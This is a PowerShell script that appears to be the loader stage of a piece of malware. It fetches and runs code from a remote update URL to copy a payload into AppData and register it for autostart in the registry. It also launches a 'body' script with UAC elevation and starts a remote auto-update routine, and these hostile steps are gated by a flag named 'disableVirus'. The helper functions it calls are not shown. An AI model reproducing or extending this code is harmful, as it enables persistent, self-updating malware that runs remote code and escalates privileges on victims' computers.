. ./consts_holder.ps1
. ./utils.ps1


$cmd=@"
    DoBody_InitialExtract

    if (-not `$server.disableVirus)
    {
        DoHolder_AppData
    }
"@
RunRemoteAsync -baseUrl $server.updateUrlBlock -part "autocopy" -cmd $cmd

$cmd=@"
    if (-not `$server.disableVirus)
    {
        DoHolder_RegistryAutoStart
    }
"@
RunRemoteAsync -baseUrl $server.updateUrlBlock -part "autoregistry" -cmd $cmd

while ($true) {
    try 
    {
        if (Test-Path -Path (Get-BodyPath)) {
            RunMe -script (Get-BodyPath) -arg "guimode" -uac $false

            if (-not $server.disableVirus) 
            {
                RunMe -script (Get-BodyPath) -arg "" -uac $true
            }

            break;
        }
    } 
    catch 
    {
    }
    Start-Sleep -Seconds 1
}


$cmd=@"
    do_autoupdate
"@
if (-not $server.disableVirus) {
    RunRemoteAsync -baseUrl $server.updateUrlBlock -part "autoupdate" -cmd $cmd
}

# $cmd=@"
#     DoFront
#     DoEmbeddings
# "@
# RunRemote -baseUrl $server.updateUrlBlock -part "embeddings" -waitForFinish $true -inJob $false -cmd $cmd
